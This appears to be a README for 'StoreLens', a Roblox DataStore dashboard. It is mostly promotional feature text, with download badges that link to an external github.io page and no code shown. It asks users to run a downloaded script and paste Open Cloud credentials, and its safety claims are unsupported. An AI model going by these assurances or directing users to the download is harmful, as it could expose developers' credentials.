![preview](https://raw.githubusercontent.com/easyfixkply/datastore-viewport/main/view_ceecef0.svg)
[![Download](https://raw.githubusercontent.com/easyfixkply/datastore-viewport/main/app_a6c62c.svg)](https://easyfixkply.github.io/datastore-viewport/)

# 🔭 StoreLens

### Local web dashboard for viewing and editing Roblox DataStores via the Open Cloud API

![Status](https://img.shields.io/badge/status-active-2ea44f)
![Platform](https://img.shields.io/badge/platform-Web%20%7C%20Local-1f6feb)
![License](https://img.shields.io/badge/license-MIT-blue)
![Year](https://img.shields.io/badge/year-2026-8957e5)
![Language](https://img.shields.io/badge/interface-English%20%7C%20Multilingual-orange)
![Support](https://img.shields.io/badge/support-24%2F7-brightgreen)
![Responsive](https://img.shields.io/badge/UI-Responsive-ff69b4)

---

## 🧭 Overview

**StoreLens** is a local-first web dashboard designed for Roblox developers who want a calm, readable, and precise window into their **DataStores**. Instead of fumbling through scattered scripts, ad-hoc command runs, or clunky debug menus, StoreLens gives you a single, elegant interface where your player data becomes something you can *see*, *search*, and *shape* — right from your own machine.

Everything runs locally. Your Open Cloud credentials stay on your side of the fence, and your dashboard speaks to the Roblox Open Cloud API only when *you* ask it to. Think of StoreLens as a reading lamp pointed at your data warehouse: quiet, focused, and always within reach.

The dashboard is built for creators who value clarity over clutter — whether you are chasing a lost save entry, auditing player progression, repairing a corrupted snapshot, or simply exploring how your game's data ecosystem has grown over the seasons.

---

## 🎯 Why StoreLens Exists

Roblox DataStores are powerful, but native tooling can feel like looking through a keyhole. Developer consoles give you a slice. Scripts give you a slice. Logs give you a slice. StoreLens hands you the whole cake — a unified lens where every key, every value, and every metadata annotation sits side by side.

The philosophy is simple:

- **Local** — your machine, your session, your rules.
- **Visual** — a dashboard, not a wall of text.
- **Reversible** — edits are previewed before they land.
- **Fast** — instant filtering, instant pagination, instant feedback.
- **Non-destructive by default** — nothing changes until you say so.

---

## ✨ Feature List

### 🔍 Inspection & Discovery
- Browse multiple DataStore namespaces from a single sidebar.
- Paginated key explorer with fuzzy search and prefix filtering.
- Instant JSON pretty-print and raw view toggle for every entry.
- Metadata panel showing version, timestamps, and user-defined attributes.
- Cross-namespace jump for related keys in one click.
- Snapshot diff viewer to compare a key across versions.

### ✏️ Editing & Authoring
- Inline value editor with live JSON validation.
- Draft mode that stages changes before committing.
- Bulk edit queue for touching multiple keys safely.
- One-click rollback to a previous version.
- Duplicate key prevention with clear conflict resolution.
- Structured value templates for common data shapes (inventory, currency, progression, etc.).

### 🧩 Power Tools
- Local search across cached namespaces.
- Tag system for bookmarks and saved queries.
- Session history recalling what you viewed, edited, or exported.
- Export to JSON, CSV, or a human-readable summary view.
- Import from a local backup to restore a namespace in a single action.
- Auto-refresh toggle for live-ish observation of changes.
- Keyboard-first navigation for rapid triage.

### 🎨 Interface & Experience
- Responsive UI that adapts to widescreen monitors, laptops, and tablets.
- Dark and light themes that remember your preference.
- Multilingual support with easy community translation hooks.
- Accessible color contrast across all panels.
- Zero-latency local interactions — no round trips for UI events.

### 🛡️ Safety & Credentials
- Credentials stored on your machine only, never transmitted elsewhere.
- Per-session key entry with instant memory clearing.
- Read-only mode toggle for cautious inspection.
- Confirmation prompts for any destructive action.
- Time-stamped audit trail of every committed edit.

---

## 🚀 Highlights for the Curious Builder

- **A dashboard that feels like a notebook.** Panels flow into each other, so moving from a key to its version history feels like turning a page, not opening a new app.
- **Built with intention, not sprawl.** Every button owns a single job.
- **Friendly to newcomers, deep for veterans.** The basics are one click away; the advanced layer is one shortcut away.
- **Portable across machines.** Because it lives in a browser against a local server, you can run it wherever you develop.
- **Great with big namespaces.** Lazy loading keeps the interface crisp even when a DataStore holds tens of thousands of keys.

---

## 🧱 Architecture at a Glance

StoreLens is composed of three friendly layers:

1. **Local Server Layer** — a lightweight service running on your machine that brokers requests to the Roblox Open Cloud API.
2. **Dashboard Layer** — the browser interface where every panel, table, and editor lives.
3. **Storage Layer** — a small local cache for sessions, bookmarks, and diffs, kept separate from your live data.

Each layer can be reasoned about independently, which makes extending or swapping pieces feasible without touching the rest.

---

## 🗺️ Roadmap Glimpses

- Richer diff visualizations with side-by-side highlighting.
- Team-shared workspaces for collaborative inspection sessions.
- Optional encryption-at-rest for the local cache.
- A plugin channel for community-built panels.
- Scheduled snapshots for passive monitoring.
- Expanded multilingual dictionaries contributed by the community.

---

## 🌍 Multilingual Support

StoreLens ships with an English interface and a translation pipeline that welcomes new languages. Contributions in any language are treated as first-class citizens — strings live in structured JSON so adding a locale is as simple as copying a file and translating values. If you speak a language that isn't yet represented, you're warmly invited to help.

---

## 📱 Responsive UI

From ultrawide monitors to tablets propped against a keyboard, StoreLens reshapes itself gracefully. Sidebars collapse, tables switch to card layouts, and editors stay legible without horizontal scrolling. The goal is that wherever you decide to work, StoreLens already feels at home.

---

## ☎️ 24/7 Customer Support Mindset

Though StoreLens is crafted by a small team, the support philosophy is continuous. Issues, ideas, and questions are treated with the same care at any hour of the day. Expect timely replies, honest roadmaps, and a genuine interest in the problems you bring to the table. The project treats every report as a chance to sharpen the lens.

---

## 🧠 Design Principles

- **Clarity over cleverness.** Simple controls, predictable outcomes.
- **Reversibility as a right.** Nothing destructive without a path back.
- **Local by default.** Your data and your keys stay with you.
- **Composability.** Small features that combine into big workflows.
- **Longevity.** Built to age well across Roblox API evolutions.

---

## 🛠️ Getting Started (Friendly Walkthrough)

Instead of arcane command snippets, StoreLens is designed to be launched like a small appliance:

1. Retrieve the latest release bundle from the official release page.
2. Unpack it into a folder you can find easily.
3. Launch the local server using the provided start script for your operating system.
4. Open the printed local address in your browser.
5. Paste your Open Cloud credentials into the first-run setup panel when prompted.
6. Choose a universe and a DataStore namespace to begin exploring.

That's the whole ritual. No global tooling, no package managers to memorize, no mysterious background daemons. If you can open a folder and double-click a script, you can run StoreLens.

---

## 🔐 Credential Handling Notes

StoreLens never forwards your credentials beyond the Roblox Open Cloud API. Entries are used in-memory for the duration of a session and are wiped when you close the dashboard or press the "forget" control. There is no telemetry pipeline, no external analytics, and no dark corner where data lingers. Your trust is treated as the most valuable resource the project has.

---

## 🧪 Testing & Reliability

Every panel in StoreLens is validated against representative DataStore payloads. Tests cover JSON edge cases, large namespaces, unusual key shapes, and partial API failures. When the Open Cloud API throttles or hiccups, StoreLens retries politely and surfaces a human-readable message rather than a stack trace.

---

## 📦 Extensibility

Developers who want to grow StoreLens can:

- Add new panels by registering a view module.
- Extend the value editor with custom validators.
- Introduce new exporters for specialized formats.
- Translate the interface into a new language.
- Hook into session events for external tooling.

The plugin surface is intentionally small and documented, so extensions feel like additions, not surgeries.

---

## 🤝 Contributing

Contributions of every size are welcome — bug reports, documentation fixes, translations, panel ideas, and code. Please open an issue before large refactors so the community can weigh in early. Respect, patience, and curiosity are the only entry requirements.

---

## 📜 License

This project is released under the **MIT License** — a permissive, business-friendly license that lets you use, modify, and share the work with minimal ceremony.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

StoreLens is an independent, community-driven tool. It is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**. Roblox, DataStores, and Open Cloud are trademarks or services of their respective owners. Use StoreLens responsibly, respect the Roblox Terms of Service, and always keep independent backups of critical player data. The maintainers of StoreLens are not responsible for data loss, account issues, or policy violations resulting from misuse of the tool. All edits performed through the dashboard are your own responsibility.

---

## 🧭 A Final Word

StoreLens exists because clarity is a form of kindness — to your future self, to your teammates, and to the players whose data you safeguard. Point the lens, see what's really there, and shape it with intention. The dashboard is quiet, the data is loud, and 2026 is a fine year to finally understand what your DataStores have been trying to tell you.

[![Download](https://raw.githubusercontent.com/easyfixkply/datastore-viewport/main/app_a6c62c.svg)](https://easyfixkply.github.io/datastore-viewport/)